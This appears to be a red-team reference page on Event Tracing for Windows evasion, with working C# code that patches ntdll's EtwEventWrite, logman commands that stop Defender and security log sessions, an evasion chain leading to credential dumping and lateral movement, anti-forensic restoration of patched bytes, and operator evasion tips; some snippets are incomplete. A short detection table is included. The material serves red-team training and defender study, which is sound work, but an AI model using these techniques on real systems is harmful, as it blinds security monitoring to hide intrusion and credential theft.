# ETW (Event Tracing for Windows) Evasion

> **MITRE ATT&CK**: Defense Evasion > T1562.006 - Impair Defenses: Indicator Blocking
> **Platforms**: Windows
> **Required Privileges**: Admin/SYSTEM (full disable), User (per-process patching)
> **OPSEC Risk**: High

## Strategic Overview

Event Tracing for Windows (ETW) is the kernel-level instrumentation framework that underpins nearly all security telemetry on Windows. EDR products, Sysmon, Windows Defender, and SIEM forwarding all consume ETW events for process creation, .NET assembly loading, network connections, file operations, and registry changes. For a Red Team Lead, ETW evasion is arguably more important than AMSI bypass -- AMSI only covers scripting engines, but ETW feeds data to every defensive sensor on the host. Disabling ETW in-process creates a blind spot where subsequent activities (including AMSI bypass, credential dumping, lateral movement) generate zero telemetry from the patched process.

## Technical Deep-Dive

### ETW Architecture

ETW operates on a provider-consumer model:
- **Providers**: Kernel and user-mode components that generate events (e.g., Microsoft-Windows-DotNETRuntime, Microsoft-Windows-Kernel-Process)
- **Sessions/Controllers**: Configure which providers are active and where events flow
- **Consumers**: Applications that read events (EDR agents, Event Log service, Sysmon)

The critical API chain: Provider calls `EtwEventWrite()` in `ntdll.dll` which issues a syscall to the kernel ETW infrastructure.

### EtwEventWrite Patching (Most Common)

Patch `ntdll!EtwEventWrite` to return immediately, preventing all ETW events from the current process:

```csharp
// C# -- Patch EtwEventWrite with a ret instruction
using System;
using System.Runtime.InteropServices;

public class EtwPatch {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
        uint oldProtect;
        VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);  // PAGE_EXECUTE_READWRITE
        Marshal.WriteByte(etwAddr, 0xC3);  // ret instruction
        VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);  // restore
    }
}
```

PowerShell equivalent:

```powershell
$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
    [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.Win32.UnsafeNativeMethods").GetType().Module)
# Alternatively, use P/Invoke to resolve EtwEventWrite and patch with 0xC3
```

### .NET ETW Provider Bypass

The .NET CLR emits events via `Microsoft-Windows-DotNETRuntime` (GUID: e13c0d23-ccbc-4e12-931b-d9cc2eee27e4). EDR uses these to detect .NET assembly loading (including execute-assembly attacks).

```csharp
// Patch the .NET ETW provider registration
// Target: clrjit.dll or coreclr.dll EventPipe infrastructure
// Method: Zero out the provider GUID or patch EventPipeProvider::WriteEvent
var eventPipeType = typeof(System.Diagnostics.Tracing.EventSource);
var field = eventPipeType.GetField("s_currentPid",
    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
// Manipulate internal state to suppress events
```

### ETW Threat Intelligence Provider

The `Microsoft-Windows-Threat-Intelligence` ETW provider is a special kernel-mode provider that EDR products register for. It reports on:
- Memory allocation with executable permissions
- Process injection attempts
- Credential access (LSASS reads)
- Kernel callback registrations

```
# This provider requires Protected Process Light (PPL) to consume
# Fully disabling it requires kernel-mode access:
# 1. BYOVD to load vulnerable driver
# 2. Use driver to unregister ETI callbacks
# 3. Or patch nt!EtwTiLogInsertEvent in kernel memory

# Partial user-mode evasion: use direct syscalls to avoid
# the instrumented API surface that feeds ETI events
```

### Per-Process vs System-Wide Patching

| Scope | Method | Privilege | Risk |
|-------|--------|-----------|------|
| Per-process | Patch ntdll in current process | User | Low -- only affects your process |
| Per-process | NtTraceControl to disable session | Admin | Medium -- stops specific session |
| System-wide | Stop EventLog service threads | SYSTEM | High -- visible gap in all logs |
| Kernel-level | Patch kernel ETW functions | Kernel | Critical -- requires driver |

### Disabling Specific ETW Sessions

```powershell
# List active ETW sessions (requires admin)
logman query -ets

# Stop a specific session (e.g., Defender's session)
logman stop "DiagTrack-Listener" -ets
logman stop "Eventlog-Security" -ets

# Disable .NET ETW provider for current session
# Using NtTraceControl with InfoClassEtwDisableProvider
```

### Standard Evasion Chain

The recommended order for in-process evasion:

```
1. Patch EtwEventWrite     --> Blind ETW consumers
2. Patch AmsiScanBuffer    --> Bypass content scanning
3. Load offensive tooling  --> No telemetry, no scanning
4. Execute objectives      --> Credential dump, lateral movement
5. Restore patches         --> Return functions to original state
```

### Restoring Patches (Anti-Forensics)

```csharp
// Save original bytes before patching
byte[] originalBytes = new byte[6];
Marshal.Copy(etwAddr, originalBytes, 0, 6);

// ... execute operations ...

// Restore original function prologue
VirtualProtect(etwAddr, (UIntPtr)6, 0x40, out oldProtect);
Marshal.Copy(originalBytes, 0, etwAddr, 6);
VirtualProtect(etwAddr, (UIntPtr)6, oldProtect, out oldProtect);
```

## Detection & Evasion

### Detection Indicators

| Indicator | Source | Notes |
|-----------|--------|-------|
| Patched ntdll functions | EDR memory integrity checks | Compare .text section against disk |
| ETW session stops | Kernel ETW controller events | Session termination is logged |
| Missing events (gaps) | SIEM correlation | Process exists but generates no events |
| VirtualProtect on ntdll | Kernel callbacks / ETI | Changing ntdll page permissions is suspicious |
| logman usage | Process creation logs | Querying/stopping ETW sessions |

### Evasion Guidance

- **Patch before any suspicious activity** -- the patch itself may generate an event; do it first.
- **Restore after execution** -- save original bytes, restore when done to avoid persistent anomaly.
- **Use per-process patching** -- system-wide disabling is noisy and affects all processes.
- **Combine with direct syscalls** -- some EDR products detect VirtualProtect calls on ntdll.
- **Consider hardware breakpoints** -- use DR registers to hook without modifying code bytes (no integrity check failure).
- **Target specific providers** -- disabling all ETW is overkill; disable only .NET and security-relevant providers.

---

## 2025 Techniques

### Swarmer -- Offline Registry API (Zero ETW)

Praetorian's Swarmer tool uses the Offline Registry Library (`Offreg.dll`) to construct and
write complete registry hives (including Run key persistence) without invoking any standard
`Reg*` API calls. Since EDRs and ETW providers monitor `RegCreateKey`, `RegSetValue`, etc.,
this approach produces **zero ETW registry telemetry**.

```
# How Swarmer works:
# 1. Exports target user's HKCU hive
# 2. Modifies it OFFLINE using Offreg.dll (no Reg* API calls = no ETW events)
# 3. Converts to binary hive and drops as NTUSER.MAN in user's profile directory
# 4. At next logon, NTUSER.MAN takes precedence over NTUSER.DAT
# Result: Run key persistence with zero Reg* API calls, zero ETW, zero ProcMon traces

# Works without admin (user can write to own profile directory)
# github.com/praetorian-inc/swarmer
```

### Hardware Breakpoint ETW Bypass

```
# CPU hardware breakpoints (DR0-DR3) hook EtwEventWrite in userland
# Intercepts ETW Threat Intelligence telemetry before it reaches the kernel
# Avoids direct kernel patching while neutralizing ETW-based detection

# Advantages over classic ntdll patching (writing RET to EtwEventWrite):
# - No code bytes modified (passes memory integrity checks)
# - Intercepted via VEH, not inline patching
# - Can selectively filter events rather than blocking all

# Reference: Praetorian ETW Threat Intelligence and Hardware Breakpoints (Jan 2025)
```

### ETW Disabling in Ransomware (LockBit 5.0)

LockBit 5.0 (September 2025) incorporated active ETW disabling as a standard pre-encryption
step, demonstrating that ETW bypass has been commoditized from research/red-team into ransomware
operations.

---

## Cross-References

- [AMSI Bypass](amsi-bypass.md) -- ETW evasion should precede AMSI bypass in the kill chain
- [AV/EDR Evasion](av-edr-evasion.md) -- ETW is one telemetry source EDRs consume
- [Logging Evasion](logging-evasion.md) -- ETW feeds the Windows Event Log service
- [Signature Evasion](signature-evasion.md) -- ETW patch code itself must evade static signatures
- **Registry Persistence** (04-persistence/registry-persistence.md) -- Swarmer combines ETW bypass with registry persistence

## References

- ETW architecture: https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing
- Adam Chester: "Hiding Your .NET -- ETW" -- https://www.mdsec.co.uk/
- SilkETW (FireEye) -- defensive ETW consumption framework
- Binarly research on ETW Threat Intelligence provider
- Phant0m -- EventLog service thread killing
- Praetorian: Corrupting the Hive Mind (Swarmer): https://www.praetorian.com/blog/corrupting-the-hive-mind-persistence-through-forgotten-windows-internals/
- Praetorian: ETW Threat Intelligence and Hardware Breakpoints: https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/
